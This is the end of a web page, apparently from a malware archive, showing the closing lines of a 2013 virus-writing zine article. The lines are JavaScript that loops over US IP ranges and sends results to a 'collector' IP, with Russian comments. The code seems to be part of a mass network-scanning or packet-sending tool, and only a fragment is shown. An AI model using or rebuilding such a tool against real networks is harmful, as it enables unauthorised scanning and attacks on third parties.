&nbsp; &nbsp; repeater<span style="color: black;">&#40;</span>diapasons<span style="color: #339933;">,</span> current_ip <span style="color: #339933;">+</span> <span style="color: #CC0000;">1</span><span style="color: #339933;">,</span> endIp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp;<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">var</span> collectorIp <span style="color: #339933;">=</span> <span style="color: #3366CC;">'1.2.3.4'</span><span style="color: #339933;">;</span> <span style="color: black; font-style: italic;">// IP клиента, принимающего пакеты</span><br/>
<span style="color: #000066; font-weight: bold;">var</span> collectorIpLong <span style="color: #339933;">=</span> ip2long<span style="color: black;">&#40;</span>collectorIp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: black; font-style: italic;">//для рандома передаем undefined вместо списка айпи</span><br/>
<span style="color: black; font-style: italic;">//repeater(undefined, undefined, undefined);</span><br/>
<span style="color: black; font-style: italic;">//для отправке по диапазонам, передаем отпарсенный диапазон</span><br/>
repeater<span style="color: black;">&#40;</span>parseIpFile<span style="color: black;">&#40;</span><span style="color: #3366CC;">'US_ipranges.txt'</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">undefined</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">undefined</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<div align="right">
MZh<br/>
2013<br/>
Inception E-Zine
</div>
[<a style="" href="/lib/?lang=EN&amp;index=VX#vmz00">Back to index</a>] [<a href="/lib/vmz00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vmz00">de</a><a href="/lib/index.php?lang=en&amp;id=vmz00">en</a><a href="/lib/index.php?lang=es&amp;id=vmz00">es</a><a href="/lib/index.php?lang=it&amp;id=vmz00">it</a><a href="/lib/index.php?lang=fr&amp;id=vmz00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vmz00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vmz00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vmz00">ua</a></div>
</body>
</html>
